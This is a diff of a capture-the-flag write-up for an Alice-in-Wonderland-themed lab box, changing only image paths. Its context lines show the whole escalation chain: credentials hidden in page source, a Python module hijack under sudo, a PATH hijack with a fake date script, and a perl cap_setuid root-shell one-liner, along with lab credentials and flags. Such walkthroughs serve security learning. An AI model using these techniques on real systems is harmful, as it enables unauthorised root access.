@@ -127,7 +127,7 @@ The `/r/` directory plus the `rabbit` hint suggested the directory structure its
 http://10.48.132.48/r/a/b/b/i/t/
 ```
 
-![Enter Wonderland page at /r/a/b/b/i/t/](images/img09.png)
+![Enter Wonderland page at /r/a/b/b/i/t/](9.png)
 
 Viewing the page source revealed a hidden (`display: none;`) paragraph containing what looked like SSH credentials:
 
@@ -135,7 +135,7 @@ Viewing the page source revealed a hidden (`display: none;`) paragraph containin
 alice:HowDothTheLittleCrocodileImproveHisShiningTail
 ```
 
-![Page source showing hidden credentials](images/img10.png)
+![Page source showing hidden credentials](10.png)
 
 ## 5. Initial Access — SSH as alice
 
@@ -155,7 +155,7 @@ ssh alice@10.48.132.48
 sudo -l
 ```
 
-![sudo -l output for alice](images/img12.png)
+![sudo -l output for alice](12.png)
 
 Alice can run, as user **rabbit**, without further restriction:
 
@@ -167,7 +167,7 @@ Alice can run, as user **rabbit**, without further restriction:
 
 Ran `linpeas.sh` for enumeration.
 
-![linpeas.sh present in home directory](images/img13.png)
+![linpeas.sh present in home directory](13.png)
 
 A challenge hint indicated the flags were placed "upside down" — i.e., swapped relative to the usual convention. `root.txt` sat in alice's home directory, while the real user flag was retrievable from `/root/user.txt`:
 
@@ -175,7 +175,7 @@ A challenge hint indicated the flags were placed "upside down" — i.e., swapped
 cat /root/user.txt
 ```
 
-![Reading the user flag from /root/user.txt](images/img14.png)
+![Reading the user flag from /root/user.txt](14.png)
 
 ```
 thm{Curiouser and curiouser!}
@@ -190,8 +190,8 @@ echo "import subprocess;subprocess.call('/bin/sh');" > random.py
 sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 ```
 
-![Creating the malicious random.py and hijacking the sudo python run](images/img15.png)
-![Confirming shell as rabbit and directory listing](images/img16.png)
+![Creating the malicious random.py and hijacking the sudo python run](15.png)
+![Confirming shell as rabbit and directory listing](16.png)
 
 This is effectively a Trojan-module attack: when `walrus_and_the_carpenter.py` runs (as `rabbit`, via `sudo`) and hits `import random`, Python loads the attacker-controlled `random.py` sitting in the same directory instead of the real standard-library module, executing the embedded shell payload and dropping a shell as **rabbit**.
 
@@ -203,7 +203,7 @@ In rabbit's home directory sat a compiled binary, `teaParty`.
 ./teaParty
 ```
 
-![Running teaParty — segfaults after a garbled prompt](images/img17.png)
+![Running teaParty — segfaults after a garbled prompt](17.png)
 
 It crashed with a segfault. Inspecting the binary's embedded strings showed it shells out to external commands without an absolute path:
 
@@ -211,7 +211,7 @@ It crashed with a segfault. Inspecting the binary's embedded strings showed it s
 /bin/echo -n 'Probably by ' && date --date='next hour'
 ```
 
-![Strings in the teaParty binary revealing the unqualified date call](images/img18.png)
+![Strings in the teaParty binary revealing the unqualified date call](18.png)
 
 Since `date` is called by name (not `/bin/date`), it's resolved via `$PATH` — classic `PATH` hijack setup. Prepended rabbit's home directory to `$PATH` and dropped a fake `date` that spawns a shell instead:
 
@@ -222,7 +222,7 @@ chmod +x ./date
 ./teaParty
 ```
 
-![PATH hijack: fake date binary launches bash as hatter](images/img19.png)
+![PATH hijack: fake date binary launches bash as hatter](19.png)
 
 Running `teaParty` again now executes the attacker's `date` script instead of the real one, dropping a shell as user **hatter**.
 
@@ -234,11 +234,11 @@ Checked for binaries with elevated Linux capabilities:
 getcap -r / 2>/dev/null
 ```
 
-![getcap output showing perl with cap_setuid+ep](images/img20.png)
+![getcap output showing perl with cap_setuid+ep](20.png)
 
 `/usr/bin/perl5.26.1` (and the `perl` symlink) carry `cap_setuid+ep` — meaning perl can set its effective UID to 0 even when run as an unprivileged user. This is a textbook GTFOBins privilege escalation vector.
 
-![GTFOBins reference for perl capability abuse](images/img21.png)
+![GTFOBins reference for perl capability abuse](21.png)
 
 Abused the capability to spawn a root shell:
 
@@ -246,7 +246,7 @@ Abused the capability to spawn a root shell:
 perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
 ```
 
-![Running the perl capability exploit as hatter](images/img23.png)
+![Running the perl capability exploit as hatter](23.png)
 
 The prompt drops straight to `#`, confirming a root shell.
 
@@ -260,7 +260,7 @@ cd alice
 cat root.txt
 ```
 
-![Root shell listing /home and reading the final flag](images/img24.png)
+![Root shell listing /home and reading the final flag](24.png)
 
 Solved:
 
